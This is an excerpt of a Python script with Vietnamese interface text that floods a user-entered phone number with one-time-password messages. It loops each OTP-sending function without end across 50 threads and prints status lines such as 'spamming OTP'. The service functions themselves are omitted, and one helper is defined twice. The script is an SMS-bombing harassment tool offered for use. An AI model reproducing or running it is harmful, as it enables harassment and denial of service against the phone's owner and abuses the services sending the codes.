...
def send_otp_continuous(func, phone):
    while True:
        try:
            func(phone)
...
phone = input(f"{Fore.CYAN}{Style.BRIGHT}Nhập số điện thoại: {Style.RESET_ALL}")
...
def send_otp_continuous(func, phone_number):
    service_name = func.__name__.replace("send_otp_via_", "")
    while True:
        try:
            func(phone_number)
        except Exception:
...
print(f"{Fore.GREEN}{Style.BRIGHT}>> Bắt đầu gửi OTP spam đến số: {phone}{Style.RESET_ALL}")

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    future_to_func = {executor.submit(send_otp_continuous, func, phone): func for func in otp_functions}
    
    try:
        while True:
            time.sleep(5)
            print(f"{Fore.YELLOW}{Style.BRIGHT}>> Đang spam OTP...{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}{Style.BRIGHT}>> Đã dừng spam OTP!{Style.RESET_ALL}")
